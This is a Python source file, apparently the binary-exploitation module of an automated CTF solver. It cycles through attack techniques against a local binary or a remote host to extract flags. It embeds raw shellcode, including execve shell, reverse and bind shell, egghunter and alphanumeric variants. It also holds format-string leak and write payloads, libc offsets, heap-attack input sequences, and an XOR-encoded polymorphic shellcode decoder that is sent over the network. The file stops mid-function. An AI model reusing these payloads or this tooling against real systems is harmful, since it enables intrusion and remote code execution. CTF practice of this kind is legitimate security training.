"""Binary exploitation module - Advanced pwn techniques"""

import struct
import subprocess
import os
import re
import socket
import time
from pathlib import Path
from typing import Optional, List, Tuple, Dict

from core.challenge import Challenge, ChallengeResult
from .base import BaseModule


class PwnModule(BaseModule):
    """Advanced automated binary exploitation with comprehensive attack vectors"""
    
    # Common libc offsets for multiple versions
    LIBC_OFFSETS = {
        'libc6_2.27': {
            'system': 0x4f550, 'execve': 0xe4e30, '/bin/sh': 0x1b3e1a,
            'one_gadget': [0x4f3d5, 0x4f432, 0x10a41c],
        },
        'libc6_2.31': {
            'system': 0x55410, 'execve': 0xe6260, '/bin/sh': 0x1b75aa,
            'one_gadget': [0xe6c7e, 0xe6c81, 0xe6c84],
        },
        'libc6_2.35': {
            'system': 0x50d70, 'execve': 0xebc85, '/bin/sh': 0x1d8678,
            'one_gadget': [0x50a47, 0xebc81, 0xebc88],
        },
    }
    
    # Common gadgets patterns (x86 and x64)
    GADGET_PATTERNS = {
        'x64': {
            'pop_rdi': b'\x5f\xc3',
            'pop_rsi': b'\x5e\xc3',
            'pop_rdx': b'\x5a\xc3',
            'pop_rax': b'\x58\xc3',
            'pop_rbx': b'\x5b\xc3',
            'pop_rcx': b'\x59\xc3',
            'pop_rsp': b'\x5c\xc3',
            'pop_rbp': b'\x5d\xc3',
            'ret': b'\xc3',
            'leave_ret': b'\xc9\xc3',
            'syscall': b'\x0f\x05',
            'pop_rdi_pop_rsi': b'\x5f\x5e\xc3',
            'pop_rdi_pop_rbp': b'\x5f\x5d\xc3',
            'xchg_eax_edi': b'\x97\xc3',
            'mov_rdi_rax': b'\x48\x89\xc7\xc3',
        },
        'x86': {
            'pop_eax': b'\x58\xc3',
            'pop_ebx': b'\x5b\xc3',
            'pop_ecx': b'\x59\xc3',
            'pop_edx': b'\x5a\xc3',
            'pop_esi': b'\x5e\xc3',
            'pop_edi': b'\x5f\xc3',
            'pop_ebp': b'\x5d\xc3',
            'ret': b'\xc3',
            'leave_ret': b'\xc9\xc3',
            'int_0x80': b'\xcd\x80',
        }
    }
    
    # Comprehensive shellcode collection
    SHELLCODES = {
        # x86 shellcodes
        'x86_execve': b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80',
        'x86_execve_short': b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80',
        'x86_read_flag': b'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x05\x68\x2e\x74\x78\x74\x68\x66\x6c\x61\x67\x89\xe3\xcd\x80\x89\xc3\xb0\x03\x89\xe1\xb2\x64\xcd\x80\xb0\x04\xb3\x01\xcd\x80',
        'x86_reverse_shell': b'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80',
        'x86_bind_shell': b'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6',
        'x86_egghunter': b'\x66\x81\xca\xff\x0f\x42\x52\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x90\x50\x90\x50\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7',
        
        # x64 shellcodes
        'x64_execve': b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05',
        'x64_execve_short': b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x54\x5f\xb0\x3b\x0f\x05',
        'x64_read_flag': b'\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\xb0\x02\x48\xbf\x66\x6c\x61\x67\x2e\x74\x78\x74\x57\x48\x89\xe7\x0f\x05\x48\x89\xc7\x48\x31\xc0\x48\x89\xe6\xb2\x64\x0f\x05\xb0\x01\xbf\x01\x00\x00\x00\x0f\x05',
        'x64_reverse_shell': b'\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05',
        'x64_egghunter': b'\xfc\x48\x31\xc9\x48\x81\xe9\xf8\xff\xff\xff\x48\x8d\x05\xef\xff\xff\xff\x48\xbb',
        
        # Alphanumeric shellcodes
        'x86_alpha_execve': b'PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA',
        
        # Null-free shellcodes
        'x86_null_free': b'\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh',
    }
    
    # Format string payloads
    FORMAT_STRING_PAYLOADS = [
        b'%x' * 20,
        b'%s' * 10,
        b'%p' * 20,
        b'%n',
        b'AAAA' + b'%x.' * 50,
        b'%08x.' * 20,
        b'%lx.' * 20,
        b'%llx.' * 20,
        b'AAAA%p%p%p%p%p%p%p%p%p%p',
        b'%1$x',
        b'%2$x',
        b'%3$x',
        b'%7$x',
        b'%15$x',
        b'%23$x',
        b'%31$x',
        b'%1$s',
        b'%1$n',
        b'%hn',
        b'%hhn',
    ]
    
    # Heap exploitation patterns
    HEAP_PATTERNS = {
        'fastbin_dup': 'double free in fastbin',
        'house_of_force': 'top chunk overwrite',
        'house_of_spirit': 'fake chunk free',
        'house_of_lore': 'smallbin corruption',
        'house_of_orange': 'unsorted bin attack',
        'tcache_dup': 'tcache double free',
        'tcache_poison': 'tcache fd overwrite',
    }
    
    # GOT/PLT common functions
    GOT_TARGETS = ['printf', 'puts', 'gets', 'read', 'write', 'system', 'exit', 'malloc', 'free', 'strlen', 'strcmp', 'strcpy', 'memcpy', 'atoi']
    
    # Canary bypass patterns
    CANARY_LEAK_PATTERNS = [
        b'%p' * 50,  # Format string leak
        b'%15$p',    # Direct parameter access
        b'%17$p',
        b'%23$p',
    ]
    
    def __init__(self, config):
        super().__init__(config)
        self.libc_database = config.get('modules.pwn.libc_database', '/opt/libc-database')
        self.rop_depth = config.get('modules.pwn.rop_gadget_depth', 10)
        self.timeout = config.get('modules.pwn.timeout', 10)
        self.binary_info = {}
    
    def solve(self, challenge: Challenge) -> ChallengeResult:
        """Solve pwn challenge with comprehensive advanced techniques"""
        result = self.create_result(challenge, False)
        
        if not challenge.has_connection and not challenge.has_files:
            result.error = "No binary or connection info provided"
            return result
        
        binary_path = None
        if challenge.has_files:
            binary_path = challenge.files[0]
            result.add_log(f"Analyzing binary: {binary_path}")
        
        # Comprehensive exploitation techniques
        techniques = [
            # Analysis
            self._analyze_binary,
            self._analyze_security_features,
            
            # Basic exploitation
            self._try_buffer_overflow,
            self._try_format_string,
            self._try_format_string_write,
            
            # Return-oriented attacks
            self._try_ret2win,
            self._try_ret2libc,
            self._try_ret2csu,
            self._try_rop_chain,
            self._try_sigreturn,
            
            # Shellcode injection
            self._try_shellcode,
            self._try_shellcode_polymorphic,
            
            # Integer vulnerabilities
            self._try_integer_overflow,
            self._try_integer_underflow,
            
            # Heap exploitation
            self._try_heap_overflow,
            self._try_use_after_free,
            self._try_double_free,
            self._try_tcache_poison,
            
            # Advanced techniques
            self._try_got_overwrite,
            self._try_canary_leak,
            self._try_pie_leak,
            self._try_one_gadget,
            self._try_stack_pivot,
            
            # Race conditions
            self._try_race_condition,
        ]
        
        for technique in techniques:
            try:
                flag = technique(challenge, binary_path, result)
                if flag:
                    result.success = True
                    result.flag = flag
                    result.method = technique.__name__
                    return result
            except Exception as e:
                result.add_log(f"Error in {technique.__name__}: {e}")
        
        result.error = "No exploitable vulnerabilities found"
        return result
    
    def _analyze_binary(self, challenge: Challenge, binary_path: Path, result: ChallengeResult) -> str:
        """Analyze binary for vulnerabilities"""
        if not binary_path or not binary_path.exists():
            return None
        
        result.add_log("Analyzing binary properties...")
        
        try:
            # Check file type
            file_output = subprocess.check_output(['file', str(binary_path)], 
                                                  stderr=subprocess.DEVNULL,
                                                  timeout=5).decode()
            result.add_log(f"File type: {file_output.strip()}")
            
            # Check security features
            try:
                checksec_output = subprocess.check_output(['checksec', '--file', str(binary_path)],
                                                         stderr=subprocess.DEVNULL,
                                                         timeout=5).decode()
                result.add_log(f"Security: {checksec_output}")
            except:
                pass
            
            # Extract strings for analysis
            strings_output = subprocess.check_output(['strings', str(binary_path)],
                                                    stderr=subprocess.DEVNULL,
                                                    timeout=10).decode()
            
            flag = self.extract_flag(strings_output)
            if flag:
                result.add_log("Found flag in binary strings")
                return flag
                
        except Exception as e:
            result.add_log(f"Binary analysis error: {e}")
        
        return None

    def _try_buffer_overflow(self, challenge: Challenge, binary_path: Path, result: ChallengeResult) -> str:
        """Try buffer overflow exploitation"""
        result.add_log("Testing buffer overflow...")
        
        if not challenge.has_connection:
            # Try local execution
            if binary_path and binary_path.exists():
                try:
                    binary_path.chmod(0o755)
                    for size in [32, 64, 100, 128, 256, 512, 1024]:
                        payload = b'A' * size
                        try:
                            output = subprocess.check_output([str(binary_path)],
                                                           input=payload,
                                                           stderr=subprocess.STDOUT,
                                                           timeout=5).decode('utf-8', errors='ignore')
                            flag = self.extract_flag(output)
                            if flag:
                                result.add_log(f"Buffer overflow with {size} bytes")
                                return flag
                        except subprocess.CalledProcessError as e:
                            output = e.output.decode('utf-8', errors='ignore') if e.output else ''
                            flag = self.extract_flag(output)
                            if flag:
                                return flag
                except Exception as e:
                    result.add_log(f"Local overflow test error: {e}")
            return None
        
        # Remote exploitation
        try:
            from pwn import remote, context
            context.log_level = 'error'
            
            for size in [32, 64, 100, 128, 256, 512]:
                try:
                    conn = remote(challenge.host, challenge.port, timeout=5)
                    payload = b'A' * size
                    conn.sendline(payload)
                    response = conn.recvall(timeout=2).decode('utf-8', errors='ignore')
                    conn.close()
                    
                    flag = self.extract_flag(response)
                    if flag:
                        result.add_log(f"Buffer overflow successful with {size} bytes")
                        return flag
                except:
                    pass
        except ImportError:
            result.add_log("pwntools not available")
        
        return None
    
    def _try_format_string(self, challenge: Challenge, binary_path: Path, result: ChallengeResult) -> str:
        """Try format string vulnerability"""
        result.add_log("Testing format string...")
        
        format_payloads = [
            b'%x' * 20,
            b'%s' * 10,
            b'%p' * 20,
            b'%n',
            b'AAAA' + b'%x.' * 50,
            b'%08x.' * 20,
        ]
        
        if not challenge.has_connection:
            if binary_path and binary_path.exists():
                try:
                    binary_path.chmod(0o755)
                    for payload in format_payloads:
                        try:
                            output = subprocess.check_output([str(binary_path)],
                                                           input=payload,
                                                           stderr=subprocess.STDOUT,
                                                           timeout=5).decode('utf-8', errors='ignore')
                            flag = self.extract_flag(output)
                            if flag:
                                result.add_log("Format string vulnerability exploited")
                                return flag
                        except:
                            pass
                except:
                    pass
            return None
        
        try:
            from pwn import remote, context
            context.log_level = 'error'
            
            for payload in format_payloads:
                try:
                    conn = remote(challenge.host, challenge.port, timeout=5)
                    conn.sendline(payload)
                    response = conn.recvall(timeout=2).decode('utf-8', errors='ignore')
                    conn.close()
                    
                    flag = self.extract_flag(response)
                    if flag:
                        result.add_log("Format string vulnerability exploited")
                        return flag
                except:
                    pass
        except ImportError:
            pass
        
        return None
    
    def _try_ret2win(self, challenge: Challenge, binary_path: Path, result: ChallengeResult) -> str:
        """Try ret2win technique"""
        result.add_log("Testing ret2win...")
        
        if not binary_path or not binary_path.exists():
            return None
        
        try:
            from pwn import ELF, remote, p64, p32, context
            context.log_level = 'error'
            
            elf = ELF(str(binary_path))
            
            # Look for win function
            win_funcs = ['win', 'flag', 'get_flag', 'print_flag', 'shell', 'secret', 'backdoor']
            win_addr = None
            
            for func in win_funcs:
                if func in elf.symbols:
                    win_addr = elf.symbols[func]
                    result.add_log(f"Found win function: {func} at {hex(win_addr)}")
                    break
            
            if not win_addr:
                return None
            
            # Determine architecture
            pack = p64 if elf.bits == 64 else p32
            
            if challenge.has_connection:
                # Try different offsets
                for offset in range(16, 256, 8):
                    try:
                        conn = remote(challenge.host, challenge.port, timeout=5)
                        payload = b'A' * offset + pack(win_addr)
                        conn.sendline(payload)
                        response = conn.recvall(timeout=2).decode('utf-8', errors='ignore')
                        conn.close()
                        
                        flag = self.extract_flag(response)
                        if flag:
                            result.add_log(f"ret2win successful with offset {offset}")
                            return flag
                    except:
                        pass
        except ImportError:
            result.add_log("pwntools not available")
        except Exception as e:
            result.add_log(f"ret2win error: {e}")
        
        return None

    def _try_ret2libc(self, challenge: Challenge, binary_path: Path, result: ChallengeResult) -> str:
        """Try ret2libc attack"""
        result.add_log("Testing ret2libc...")
        
        if not binary_path or not binary_path.exists():
            return None
        
        try:
            from pwn import ELF, remote, p64, p32, context
            context.log_level = 'error'
            
            elf = ELF(str(binary_path))
            
            # Check if libc is available
            if 'system' in elf.plt:
                result.add_log("Found system@plt")
            
            if 'puts' in elf.plt:
                result.add_log("Found puts@plt - can leak libc")
            
            # This is a simplified check - full implementation would
            # leak libc addresses and calculate offsets
            
        except ImportError:
            result.add_log("pwntools not available")
        except Exception as e:
            result.add_log(f"ret2libc error: {e}")
        
        return None
    
    def _try_rop_chain(self, challenge: Challenge, binary_path: Path, result: ChallengeResult) -> str:
        """Try ROP chain exploitation"""
        result.add_log("Testing ROP chain...")
        
        if not binary_path or not binary_path.exists():
            return None
        
        try:
            from pwn import ELF, ROP, context
            context.log_level = 'error'
            
            elf = ELF(str(binary_path))
            rop = ROP(elf)
            
            # Find useful gadgets
            gadgets = []
            try:
                gadgets.append(('pop rdi', rop.find_gadget(['pop rdi', 'ret'])))
            except:
                pass
            try:
                gadgets.append(('ret', rop.find_gadget(['ret'])))
            except:
                pass
            
            for name, gadget in gadgets:
                if gadget:
                    result.add_log(f"Found gadget: {name} at {hex(gadget[0])}")
            
        except ImportError:
            result.add_log("pwntools not available")
        except Exception as e:
            result.add_log(f"ROP error: {e}")
        
        return None
    
    def _try_shellcode(self, challenge: Challenge, binary_path: Path, result: ChallengeResult) -> str:
        """Try shellcode injection"""
        result.add_log("Testing shellcode injection...")
        
        if not challenge.has_connection:
            return None
        
        try:
            from pwn import remote, asm, shellcraft, context
            context.log_level = 'error'
            
            # Try different architectures
            for arch in ['amd64', 'i386']:
                context.arch = arch
                
                # Generate shellcode to read flag
                try:
                    shellcode = asm(shellcraft.cat('/flag.txt'))
                except:
                    shellcode = asm(shellcraft.sh())
                
                # Try with NOP sled
                nop_sled = b'\x90' * 100
                payload = nop_sled + shellcode
                
                try:
                    conn = remote(challenge.host, challenge.port, timeout=5)
                    conn.sendline(payload)
                    response = conn.recvall(timeout=2).decode('utf-8', errors='ignore')
                    conn.close()
                    
                    flag = self.extract_flag(response)
                    if flag:
                        result.add_log(f"Shellcode injection successful ({arch})")
                        return flag
                except:
                    pass
                    
        except ImportError:
            result.add_log("pwntools not available")
        except Exception as e:
            result.add_log(f"Shellcode error: {e}")
        
        return None
    
    def _try_integer_overflow(self, challenge: Challenge, binary_path: Path, result: ChallengeResult) -> str:
        """Try integer overflow"""
        result.add_log("Testing integer overflow...")
        
        overflow_values = [
            b'-1',
            b'0',
            b'2147483647',  # INT_MAX
            b'2147483648',  # INT_MAX + 1
            b'-2147483648', # INT_MIN
            b'-2147483649', # INT_MIN - 1
            b'4294967295',  # UINT_MAX
            b'4294967296',  # UINT_MAX + 1
            b'9223372036854775807',  # LONG_MAX
        ]
        
        if not challenge.has_connection:
            if binary_path and binary_path.exists():
                try:
                    binary_path.chmod(0o755)
                    for value in overflow_values:
                        try:
                            output = subprocess.check_output([str(binary_path)],
                                                           input=value,
                                                           stderr=subprocess.STDOUT,
                                                           timeout=5).decode('utf-8', errors='ignore')
                            flag = self.extract_flag(output)
                            if flag:
                                result.add_log(f"Integer overflow with {value.decode()}")
                                return flag
                        except:
                            pass
                except:
                    pass
            return None
        
        try:
            from pwn import remote, context
            context.log_level = 'error'
            
            for value in overflow_values:
                try:
                    conn = remote(challenge.host, challenge.port, timeout=5)
                    conn.sendline(value)
                    response = conn.recvall(timeout=2).decode('utf-8', errors='ignore')
                    conn.close()
                    
                    flag = self.extract_flag(response)
                    if flag:
                        result.add_log(f"Integer overflow successful with {value.decode()}")
                        return flag
                except:
                    pass
        except ImportError:
            pass
        
        return None
    
    def _analyze_security_features(self, challenge: Challenge, binary_path: Path, result: ChallengeResult) -> str:
        """Analyze binary security features in detail"""
        if not binary_path or not binary_path.exists():
            return None
        
        result.add_log("Analyzing security features...")
        
        try:
            from pwn import ELF, context
            context.log_level = 'error'
            
            elf = ELF(str(binary_path))
            
            self.binary_info = {
                'arch': elf.arch,
                'bits': elf.bits,
                'canary': elf.canary,
                'nx': elf.nx,
                'pie': elf.pie,
                'relro': elf.relro,
                'rpath': elf.rpath,
                'runpath': elf.runpath,
            }
            
            result.add_log(f"Architecture: {elf.arch} ({elf.bits}-bit)")
            result.add_log(f"Canary: {elf.canary}")
            result.add_log(f"NX: {elf.nx}")
            result.add_log(f"PIE: {elf.pie}")
            result.add_log(f"RELRO: {elf.relro}")
            
            # Check for dangerous functions
            dangerous_funcs = ['gets', 'strcpy', 'strcat', 'sprintf', 'scanf', 'vsprintf', 'printf']
            for func in dangerous_funcs:
                if func in elf.plt:
                    result.add_log(f"Dangerous function found: {func}@plt")
            
        except ImportError:
            result.add_log("pwntools not available for detailed analysis")
        except Exception as e:
            result.add_log(f"Security analysis error: {e}")
        
        return None
    
    def _try_format_string_write(self, challenge: Challenge, binary_path: Path, result: ChallengeResult) -> str:
        """Try format string write attack"""
        result.add_log("Testing format string write...")
        
        # Try to find format string offset
        offset_payloads = [f'AAAA%{i}$x'.encode() for i in range(1, 50)]
        
        if challenge.has_connection:
            try:
                from pwn import remote, context
                context.log_level = 'error'
                
                for i, payload in enumerate(offset_payloads):
                    try:
                        conn = remote(challenge.host, challenge.port, timeout=5)
                        conn.sendline(payload)
                        response = conn.recvall(timeout=2).decode('utf-8', errors='ignore')
                        conn.close()
                        
                        # Check if we found our marker (41414141 = AAAA)
                        if '41414141' in response:
                            result.add_log(f"Format string offset found at position {i+1}")
                            
                        flag = self.extract_flag(response)
                        if flag:
                            return flag
                    except:
                        pass
            except ImportError:
                pass
        
        return None
    
    def _try_ret2csu(self, challenge: Challenge, binary_path: Path, result: ChallengeResult) -> str:
        """Try ret2csu technique for calling functions with arguments"""
        result.add_log("Testing ret2csu...")
        
        if not binary_path or not binary_path.exists():
            return None
        
        try:
            from pwn import ELF, context
            context.log_level = 'error'
            
            elf = ELF(str(binary_path))
            
            # Look for __libc_csu_init gadgets
            csu_init = None
            for sym in elf.symbols:
                if 'csu_init' in sym.lower():
                    csu_init = elf.symbols[sym]
                    result.add_log(f"Found __libc_csu_init at {hex(csu_init)}")
                    break
            
            if csu_init:
                # The gadgets are typically at csu_init + offset
                # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
                # mov rdx, r14; mov rsi, r13; mov edi, r12d; call [r15+rbx*8]
                result.add_log("ret2csu gadgets available")
                
        except ImportError:
            result.add_log("pwntools not available")
        except Exception as e:
            result.add_log(f"ret2csu error: {e}")
        
        return None
    
    def _try_sigreturn(self, challenge: Challenge, binary_path: Path, result: ChallengeResult) -> str:
        """Try SROP (Sigreturn Oriented Programming)"""
        result.add_log("Testing SROP...")
        
        if not binary_path or not binary_path.exists():
            return None
        
        try:
            from pwn import ELF, context
            context.log_level = 'error'
            
            elf = ELF(str(binary_path))
            
            # Look for sigreturn syscall
            data = binary_path.read_bytes()
            
            # x64: mov rax, 15; syscall
            if b'\x48\xc7\xc0\x0f\x00\x00\x00\x0f\x05' in data:
                result.add_log("Sigreturn gadget found (x64)")
            
            # x86: mov eax, 119; int 0x80
            if b'\xb8\x77\x00\x00\x00\xcd\x80' in data:
                result.add_log("Sigreturn gadget found (x86)")
                
        except ImportError:
            result.add_log("pwntools not available")
        except Exception as e:
            result.add_log(f"SROP error: {e}")
        
        return None
    
    def _try_shellcode_polymorphic(self, challenge: Challenge, binary_path: Path, result: ChallengeResult) -> str:
        """Try polymorphic/encoded shellcode"""
        result.add_log("Testing polymorphic shellcode...")
        
        if not challenge.has_connection:
            return None
        
        try:
            from pwn import remote, context, asm, shellcraft
            context.log_level = 'error'
            
            for arch in ['amd64', 'i386']:
                context.arch = arch
                
                # XOR encoded shellcode
                shellcode = self.SHELLCODES.get(f'{arch.replace("amd64", "x64").replace("i386", "x86")}_execve')
                if not shellcode:
                    continue
                
                # Try different XOR keys
                for key in [0x41, 0x42, 0x90, 0xff]:
                    encoded = bytes([b ^ key for b in shellcode])
                    
                    # Decoder stub
                    if arch == 'amd64':
                        decoder = f'''
                            xor rcx, rcx
                            mov cl, {len(shellcode)}
                            lea rdi, [rip+shellcode]
                        decode:
                            xor byte ptr [rdi], {key}
                            inc rdi
                            loop decode
                        shellcode:
                        '''
                    else:
                        decoder = f'''
                            xor ecx, ecx
                            mov cl, {len(shellcode)}
                            call get_eip
                        get_eip:
                            pop edi
                            add edi, shellcode - get_eip
                        decode:
                            xor byte ptr [edi], {key}
                            inc edi
                            loop decode
                        shellcode:
                        '''
                    
                    try:
                        decoder_bytes = asm(decoder)
                        payload = b'\x90' * 50 + decoder_bytes + encoded
                        
                        conn = remote(challenge.host, challenge.port, timeout=5)
                        conn.sendline(payload)
                        response = conn.recvall(timeout=2).decode('utf-8', errors='ignore')
                        conn.close()
                        
                        flag = self.extract_flag(response)
                        if flag:
                            result.add_log(f"Polymorphic shellcode successful ({arch})")
                            return flag
                    except:
                        pass
                        
        except ImportError:
            result.add_log("pwntools not available")
        except Exception as e:
            result.add_log(f"Polymorphic shellcode error: {e}")
        
        return None
    
    def _try_integer_underflow(self, challenge: Challenge, binary_path: Path, result: ChallengeResult) -> str:
        """Try integer underflow attacks"""
        result.add_log("Testing integer underflow...")
        
        underflow_values = [
            b'-1',
            b'-2',
            b'-128',
            b'-129',
            b'-32768',
            b'-32769',
            b'-2147483648',
        ]
        
        if not challenge.has_connection:
            if binary_path and binary_path.exists():
                try:
                    binary_path.chmod(0o755)
                    for value in underflow_values:
                        try:
                            output = subprocess.check_output([str(binary_path)],
                                                           input=value,
                                                           stderr=subprocess.STDOUT,
                                                           timeout=5).decode('utf-8', errors='ignore')
                            flag = self.extract_flag(output)
                            if flag:
                                result.add_log(f"Integer underflow with {value.decode()}")
                                return flag
                        except subprocess.CalledProcessError as e:
                            if e.output:
                                flag = self.extract_flag(e.output.decode('utf-8', errors='ignore'))
                                if flag:
                                    return flag
                        except:
                            pass
                except:
                    pass
        
        return None
    
    def _try_heap_overflow(self, challenge: Challenge, binary_path: Path, result: ChallengeResult) -> str:
        """Try heap overflow attacks"""
        result.add_log("Testing heap overflow...")
        
        if not challenge.has_connection:
            return None
        
        try:
            from pwn import remote, context
            context.log_level = 'error'
            
            # Try to overflow heap chunks
            heap_payloads = [
                b'A' * 0x20 + b'B' * 8,  # Overflow into next chunk header
                b'A' * 0x40 + b'\x00' * 8 + b'\x41\x00\x00\x00',  # Fake chunk size
                b'A' * 0x80 + b'B' * 16,
                b'A' * 0x100 + b'C' * 32,
            ]
            
            for payload in heap_payloads:
                try:
                    conn = remote(challenge.host, challenge.port, timeout=5)
                    conn.sendline(payload)
                    response = conn.recvall(timeout=2).decode('utf-8', errors='ignore')
                    conn.close()
                    
                    flag = self.extract_flag(response)
                    if flag:
                        result.add_log("Heap overflow successful")
                        return flag
                except:
                    pass
        except ImportError:
            pass
        
        return None
    
    def _try_use_after_free(self, challenge: Challenge, binary_path: Path, result: ChallengeResult) -> str:
        """Try use-after-free attacks"""
        result.add_log("Testing use-after-free...")
        
        if not challenge.has_connection:
            return None
        
        try:
            from pwn import remote, context
            context.log_level = 'error'
            
            # Common UAF patterns: allocate, free, allocate same size, use
            uaf_sequences = [
                [b'1', b'A' * 32, b'2', b'1', b'B' * 32, b'3'],  # alloc, free, alloc, use
                [b'create', b'delete', b'create', b'use'],
                [b'add', b'remove', b'add', b'show'],
                [b'new', b'free', b'new', b'print'],
            ]
            
            for seq in uaf_sequences:
                try:
                    conn = remote(challenge.host, challenge.port, timeout=5)
                    for cmd in seq:
                        conn.sendline(cmd)
                        time.sleep(0.1)
                    response = conn.recvall(timeout=2).decode('utf-8', errors='ignore')
                    conn.close()
                    
                    flag = self.extract_flag(response)
                    if flag:
                        result.add_log("Use-after-free successful")
                        return flag
                except:
                    pass
        except ImportError:
            pass
        
        return None
    
    def _try_double_free(self, challenge: Challenge, binary_path: Path, result: ChallengeResult) -> str:
        """Try double free attacks"""
        result.add_log("Testing double free...")
        
        if not challenge.has_connection:
            return None
        
        try:
            from pwn import remote, context
            context.log_level = 'error'
            
            # Double free patterns
            double_free_sequences = [
                [b'1', b'A' * 32, b'2', b'2'],  # alloc, free, free
                [b'1', b'A' * 32, b'1', b'B' * 32, b'2', b'2', b'2'],  # fastbin dup
                [b'create', b'delete', b'delete'],
                [b'add', b'remove', b'remove'],
            ]
            
            for seq in double_free_sequences:
                try:
                    conn = remote(challenge.host, challenge.port, timeout=5)
                    for cmd in seq:
                        conn.sendline(cmd)
                        time.sleep(0.1)
                    response = conn.recvall(timeout=2).decode('utf-8', errors='ignore')
                    conn.close()
                    
                    flag = self.extract_flag(response)
                    if flag:
                        result.add_log("Double free successful")
                        return flag
                except:
                    pass
        except ImportError:
            pass
        
        return None
    
    def _try_tcache_poison(self, challenge: Challenge, binary_path: Path, result: ChallengeResult) -> str:
        """Try tcache poisoning attack (glibc 2.26+)"""
        result.add_log("Testing tcache poisoning...")
        
        if not challenge.has_connection:
            return None
        
        try:
            from pwn import remote, context, p64
            context.log_level = 'error'
            
            # Tcache poison: overwrite fd pointer to get arbitrary allocation
            # This is a simplified detection - full exploit needs target address
            
            conn = remote(challenge.host, challenge.port, timeout=5)
            
            # Allocate and free to populate tcache
            conn.sendline(b'1')  # Allocate
            conn.sendline(b'A' * 32)
            conn.sendline(b'2')  # Free
            
            # Allocate again and overwrite fd
            conn.sendline(b'1')
            conn.sendline(b'B' * 8 + p64(0x404000))  # Overwrite fd with target
            
            response = conn.recvall(timeout=2).decode('utf-8', errors='ignore')
            conn.close()
            
            flag = self.extract_flag(response)
            if flag:
                result.add_log("Tcache poisoning successful")
                return flag
        except ImportError:
            pass
        except:
            pass
        
        return None
    
    def _try_got_overwrite(self, challenge: Challenge, binary_path: Path, result: ChallengeResult) -> str:
        """Try GOT overwrite attack"""
        result.add_log("Testing GOT overwrite...")
        
        if not binary_path or not binary_path.exists():
            return None
        
        try:
            from pwn import ELF, context
            context.log_level = 'error'
            
            elf = ELF(str(binary_path))
            
            # Check RELRO
            if elf.relro == 'Full':
                result.add_log("Full RELRO - GOT is read-only")
                return None
            
            # Find GOT entries
            got_entries = {}
            for func in self.GOT_TARGETS:
                if func in elf.got:
                    got_entries[func] = elf.got[func]
                    result.add_log(f"GOT entry: {func} @ {hex(elf.got[func])}")
            
            # Look for win function to redirect to
            win_funcs = ['win', 'flag', 'get_flag', 'print_flag', 'shell', 'secret', 'backdoor', 'system']
            for func in win_funcs:
                if func in elf.symbols:
                    result.add_log(f"Potential target: {func} @ {hex(elf.symbols[func])}")
                    
        except ImportError:
            result.add_log("pwntools not available")
        except Exception as e:
            result.add_log(f"GOT analysis error: {e}")
        
        return None
    
    def _try_canary_leak(self, challenge: Challenge, binary_path: Path, result: ChallengeResult) -> str:
        """Try to leak stack canary"""
        result.add_log("Testing canary leak...")
        
        if not challenge.has_connection:
            return None
        
        try:
            from pwn import remote, context
            context.log_level = 'error'
            
            # Try format string to leak canary
            for payload in self.CANARY_LEAK_PATTERNS:
                try:
                    conn = remote(challenge.host, challenge.port, timeout=5)
                    conn.sendline(payload)
                    response = conn.recvall(timeout=2).decode('utf-8', errors='ignore')
                    conn.close()
                    
                    # Look for canary pattern (ends with 00)
                    canary_pattern = re.findall(r'0x[0-9a-f]{14}00', response)
                    if canary_pattern:
                        result.add_log(f"Potential canary leaked: {canary_pattern[0]}")
                    
                    flag = self.extract_flag(response)
                    if flag:
                        return flag
                except:
                    pass
        except ImportError:
            pass
        
        return None
    
    def _try_pie_leak(self, challenge: Challenge, binary_path: Path, result: ChallengeResult) -> str:
        """Try to leak PIE base address"""
        result.add_log("Testing PIE leak...")
        
        if not challenge.has_connection:
            return None
        
        try:
            from pwn import remote, context
            context.log_level = 'error'
            
            # Try format string to leak addresses
            leak_payloads = [
                b'%p' * 30,
                b'%1$p.%2$p.%3$p.%4$p.%5$p',
                b'%6$p.%7$p.%8$p.%9$p.%10$p',
            ]
            
            for payload in leak_payloads:
                try:
                    conn = remote(challenge.host, challenge.port, timeout=5)
                    conn.sendline(payload)
                    response = conn.recvall(timeout=2).decode('utf-8', errors='ignore')
                    conn.close()
                    
                    # Look for PIE addresses (typically 0x55 or 0x56 prefix on x64)
                    pie_pattern = re.findall(r'0x5[56][0-9a-f]{10}', response)
                    if pie_pattern:
                        result.add_log(f"Potential PIE address leaked: {pie_pattern[0]}")
                    
                    flag = self.extract_flag(response)
                    if flag:
                        return flag
                except:
                    pass
        except ImportError:
            pass
        
        return None
    
    def _try_one_gadget(self, challenge: Challenge, binary_path: Path, result: ChallengeResult) -> str:
        """Try one_gadget exploitation"""
        result.add_log("Testing one_gadget...")
        
        if not binary_path or not binary_path.exists():
            return None
        
